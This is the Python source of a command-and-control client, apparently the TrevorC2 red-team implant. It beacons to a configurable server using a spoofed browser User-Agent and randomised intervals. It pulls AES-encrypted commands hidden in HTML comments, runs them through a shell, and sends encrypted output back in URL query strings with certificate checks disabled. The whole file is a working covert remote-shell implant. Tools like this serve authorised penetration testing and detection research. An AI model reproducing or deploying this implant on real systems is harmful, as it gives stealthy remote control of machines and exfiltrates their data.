#!/usr/bin/env python
#
# TrevorC2 - legitimate looking command and control
# Written by: Dave Kennedy @HackingDave
# Website: https://www.trustedsec.com
# GIT: https://github.com/trustedsec
#
# This is the client connection, and only an example. Refer to the readme
# to build your own client connection to the server C2 infrastructure.

# CONFIG CONSTANTS:

# site used to communicate with (remote TrevorC2 site)
SITE_URL = ("http://127.0.0.1")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
ROOT_PATH_QUERY = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
SITE_PATH_QUERY = ("/images")

# THIS IS THE QUERY STRING PARAMETER USED
QUERY_STRING = ("guid=")

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
STUB = ("oldcss=")

# install_beacon_delay specifies the seconds to wait before connecting home for the first time after script start
install_beacon_delay = 0

# beacon_interval specifies the min and max for the random delay in seconds before the next beacon home
min_beacon_interval = 2
max_beacon_interval = 8

# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}

# DO NOT CHANGE BELOW THIS LINE


import base64
import hashlib
import http.cookiejar
import platform
import random
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

from Crypto import Random
from Crypto.Cipher import AES


# AES Support for Python2/3 - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """

    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')


# establish cipher
cipher = AESCipher(key=CIPHER)


# random interval for communication
def random_interval(time_interval1, time_interval2):
    return random.randint(time_interval1, time_interval2)


hostname = platform.node()
cookie = http.cookiejar.CookieJar()

# this line lets us ignore self-signed cert warnings,
# because setting ssl context check_hostname and verify_mode doesn't seem to be good enough
ssl._create_default_https_context = ssl._create_unverified_context


def build_request_opener(request):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
                                       urllib.request.HTTPSHandler(context=context))


def connect_trevor():
    # we need to register our asset first
    while 1:
        time.sleep(1)
        try:
            hostname_send = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
            hostname_send = base64.b64encode(hostname_send).decode('utf-8')

            # pipe out stdout and base64 encode it then request via a query string parameter
            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send,
                                         headers=HEADERS)
            opener = build_request_opener(req)
            html = opener.open(req)
            break

        # handle exceptions and pass if the server is unavailable, but keep going
        except Exception as error:
            # if we can't communicate, just pass
            if "Connection refused" in str(error):
                pass
            else:
                print("[!] Something went wrong trying to connect, printing error: " + str(error))


time.sleep(install_beacon_delay)
connect_trevor()

# main call back here
while 1:
    try:
        time.sleep(random_interval(min_beacon_interval, max_beacon_interval))
        req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers=HEADERS)
        opener = build_request_opener(req)
        html = opener.open(req).read().decode('utf-8')

        # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
        parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
        parse = cipher.decrypt(parse)
        if parse == "nothing":
            pass
        else:
            return_value = "nothing"
            if hostname in parse:
                parse = parse.split(hostname + "::::")[1]
                if parse.startswith("TREVORC2CFG"):
                    if parse.startswith("TREVORC2CFG SET"):
                        if parse.startswith("TREVORC2CFG SET BINT"):
                            bint = parse.replace("TREVORC2CFG SET BINT ", "").split('|')
                            min_beacon_interval = int(bint[0])
                            max_beacon_interval = int(bint[1])
                            return_value = "SUCCESS"
                    elif parse.startswith("TREVORC2CFG GET"):
                        if parse.startswith("TREVORC2CFG GET BINT"):
                            return_value = "MIN {} MAX {}".format(min_beacon_interval, max_beacon_interval)
                else:
                    # execute our parsed command
                    proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.communicate()[0]
                    return_value = stdout_value.decode('utf-8')
            return_value = cipher.encrypt(hostname + "::::" + return_value).encode('utf-8')
            return_value = base64.b64encode(return_value).decode('utf-8')

            # pipe out stdout and base64 encode it then request via a query string parameter
            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + return_value,
                                         headers=HEADERS)
            opener = build_request_opener(req)
            html = opener.open(req).read().decode('utf-8')

            # sleep and let cleanup on server side
            time.sleep(3)

    # handle exceptions and pass if the server is unavailable, but keep going
    except Exception as error:
        # if we can't communicate, just pass
        if "Connection refused" in str(error):
            connect_trevor()
        else:
            print("[!] Something went wrong, printing error: " + str(error))

    except KeyboardInterrupt:
        print("\n[!] Exiting TrevorC2 Client...")
        sys.exit()
